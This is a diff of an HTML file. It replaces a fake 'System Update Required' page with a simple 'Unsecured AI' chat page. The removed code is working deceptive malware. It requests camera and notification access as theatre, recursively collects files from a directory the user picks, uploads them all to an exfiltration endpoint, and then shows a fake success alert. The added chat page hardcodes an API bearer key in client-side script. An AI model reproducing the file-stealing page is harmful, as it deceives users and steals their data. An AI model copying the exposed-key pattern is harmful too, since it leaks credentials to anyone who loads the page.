@@ -1,220 +1,153 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Update Required</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #000;
-            color: #fff;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        /* Glowing Button Style */
-        .glow-btn {
-            position: relative;
-            padding: 20px 60px;
-            font-size: 24px;
-            color: #fff;
-            background: transparent;
-            border: 2px solid #00f3ff;
-            border-radius: 50px;
-            cursor: pointer;
-            outline: none;
-            box-shadow: 0 0 20px #00f3ff, 0 0 40px #00f3ff, 0 0 60px #00f3ff;
-            transition: 0.5s;
-            z-index: 10;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .glow-btn:hover {
-            background: #00f3ff;
-            color: #000;
-            box-shadow: 0 0 10px #00f3ff, 0 0 40px #00f3ff, 0 0 80px #00f3ff;
-        }
-
-        /* Hidden Input for File Access */
-        #fileInput {
-            display: none;
-        }
-
-        /* Loading Overlay */
-        .loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.9);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 20;
-            display: none;
-        }
-
-        .loading-text {
-            font-size: 20px;
-            color: #00f3ff;
-            animation: blink 1s infinite;
-        }
-
-        @keyframes blink {
-            0% { opacity: 0.2; }
-            50% { opacity: 1; }
-            100% { opacity: 0.2; }
-        }
-
-        .status {
-            position: absolute;
-            bottom: 20px;
-            font-size: 12px;
-            color: #555;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Unsecured AI Chat</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #121212;
+      color: #e0e0e0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .chat-container {
+      width: 100%;
+      max-width: 600px;
+      background: #1e1e1e;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+      display: flex;
+      flex-direction: column;
+      height: 90vh;
+      overflow: hidden;
+    }
+    .header {
+      padding: 16px;
+      background: #2c2c2c;
+      text-align: center;
+      font-weight: bold;
+      border-bottom: 1px solid #333;
+    }
+    .messages {
+      flex: 1;
+      padding: 16px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .message {
+      max-width: 80%;
+      padding: 10px 14px;
+      border-radius: 18px;
+      line-height: 1.4;
+      font-size: 15px;
+    }
+    .user-message {
+      align-self: flex-end;
+      background: #007bff;
+      color: white;
+      border-bottom-right-radius: 4px;
+    }
+    .ai-message {
+      align-self: flex-start;
+      background: #333;
+      color: #fff;
+      border-bottom-left-radius: 4px;
+    }
+    .input-area {
+      padding: 16px;
+      background: #2c2c2c;
+      display: flex;
+      gap: 8px;
+      border-top: 1px solid #333;
+    }
+    input[type="text"] {
+      flex: 1;
+      padding: 12px;
+      border-radius: 24px;
+      border: 1px solid #444;
+      background: #121212;
+      color: white;
+      outline: none;
+    }
+    button {
+      padding: 10px 20px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 24px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
 </head>
 <body>
 
-    <button class="glow-btn" id="startBtn">Start Now</button>
-    <div class="status" id="statusText">Waiting for user interaction...</div>
-    <div class="loading" id="loader">
-        <div class="loading-text">Uploading Data...</div>
-    </div>
+<div class="chat-container">
+  <div class="header">Unsecured AI</div>
+  <div class="messages" id="messages"></div>
+  <div class="input-area">
+    <input type="text" id="userInput" placeholder="Ask anything..." />
+    <button onclick="sendMessage()">Send</button>
+  </div>
+</div>
 
-    <!-- Hidden file input to grab files -->
-    <input type="file" id="fileInput" webkitdirectory directory multiple>
+<script>
+  const messagesDiv = document.getElementById('messages');
+  const userInput = document.getElementById('userInput');
 
-    <script>
-        // CONFIGURATION
-        const ADMIN_KEY = "9995";
-        // Replace this URL with your own backend (e.g., a Google Apps Script, PHP script, or Discord Webhook)
-        // For demonstration, I am sending to a public JSON bin or you can use your own endpoint.
-        const EXFIL_ENDPOINT = `https://jsonplaceholder.typicode.com/posts?adminKey=${ADMIN_KEY}`; 
+  userInput.addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') sendMessage();
+  });
 
-        const btn = document.getElementById('startBtn');
-        const fileInput = document.getElementById('fileInput');
-        const loader = document.getElementById('loader');
-        const statusText = document.getElementById('statusText');
+  async function sendMessage() {
+    const text = userInput.value.trim();
+    if (!text) return;
 
-        btn.addEventListener('click', async () => {
-            statusText.innerText = "Initializing Permissions...";
+    appendMessage(text, 'user');
+    userInput.value = '';
 
-            try {
-                // 1. Ask for Permissions (Camera/Notification/Mic)
-                // This creates the illusion of a system check
-                await requestPermissions();
+    try {
+      const response = await fetch("https://openrouter.ai/api/v1/chat/completions", {
+        method: "POST",
+        headers: {
+          "Authorization": "Bearer sk-or-v1-304255620656199858819607893445930465884517454165477641725723",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          model: "meta-llama/llama-3.1-8b-instruct",
+          messages: [{ role: "user", content: text }]
+        })
+      });
 
-                // 2. Trigger File Selection (Simulated "Accessing Storage")
-                statusText.innerText = "Accessing Local Storage...";
+      const data = await response.json();
+      if (data.choices && data.choices[0]) {
+        appendMessage(data.choices[0].message.content, 'ai');
+      } else {
+        appendMessage("Sorry, I couldn't understand that.", 'ai');
+      }
+    } catch (error) {
+      appendMessage("Connection error.", 'ai');
+    }
+  }
 
-                // Check if FileSystemAccess API is supported (Chrome/Edge)
-                if ('showDirectoryPicker' in window) {
-                    try {
-                        const dirHandle = await window.showDirectoryPicker();
-                        await processDirectory(dirHandle, []);
-                    } catch (err) {
-                        console.error("User cancelled picker or API error:", err);
-                        // Fallback to standard input if they cancel or API fails
-                        fileInput.click();
-                    }
-                } else {
-                    // Fallback for Safari/Firefox
-                    fileInput.click();
-                }
+  function appendMessage(text, sender) {
+    const msgDiv = document.createElement('div');
+    msgDiv.classList.add('message', sender === 'user' ? 'user-message' : 'ai-message');
+    msgDiv.innerText = text;
+    messagesDiv.appendChild(msgDiv);
+    messagesDiv.scrollTop = messagesDiv.scrollHeight;
+  }
+</script>
 
-            } catch (error) {
-                statusText.innerText = "Permission Denied or Error";
-                console.error(error);
-            }
-        });
-
-        fileInput.addEventListener('change', (e) => {
-            if (e.target.files.length > 0) {
-                statusText.innerText = "Files Selected. Encrypting...";
-                processFiles(Array.from(e.target.files));
-            }
-        });
-
-        async function requestPermissions() {
-            // Request Camera
-            try {
-                await navigator.mediaDevices.getUserMedia({ video: true });
-                statusText.innerText = "Camera Access Granted.";
-            } catch (err) {
-                statusText.innerText = "Camera Access Denied.";
-            }
-
-            // Request Notifications
-            try {
-                if ("Notification" in window) {
-                    await Notification.requestPermission();
-                }
-            } catch (err) {
-                // Silent fail
-            }
-
-            // Small delay to simulate processing
-            await new Promise(r => setTimeout(r, 1000));
-        }
-
-        // Recursive function to get all files from a directory (Modern API)
-        async function processDirectory(dirHandle, files) {
-            for await (const entry of dirHandle.values()) {
-                if (entry.kind === 'file') {
-                    const file = await entry.getFile();
-                    files.push(file);
-                } else if (entry.kind === 'directory') {
-                    await processDirectory(entry, files);
-                }
-            }
-            if (files.length > 0) {
-                statusText.innerText = `Found ${files.length} files. Uploading...`;
-                processFiles(files);
-            }
-        }
-
-        function processFiles(fileList) {
-            loader.style.display = 'flex';
-
-            // Create a FormData object to send the files
-            const formData = new FormData();
-            formData.append('adminKey', ADMIN_KEY);
-            formData.append('timestamp', new Date().toISOString());
-
-            fileList.forEach((file, index) => {
-                formData.append(`file_${index}`, file);
-            });
-
-            // Send to the "Admin" (Exfiltration)
-            fetch(EXFIL_ENDPOINT, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                loader.style.display = 'none';
-                statusText.innerText = "Update Complete.";
-                btn.style.display = 'none';
-
-                // Optional: Redirect to a fake "Success" page or just leave it
-                setTimeout(() => {
-                    alert("System Updated Successfully.");
-                }, 500);
-            })
-            .catch(error => {
-                loader.style.display = 'none';
-                statusText.innerText = "Upload Failed.";
-                console.error(error);
-            });
-        }
-    </script>
 </body>
 </html>
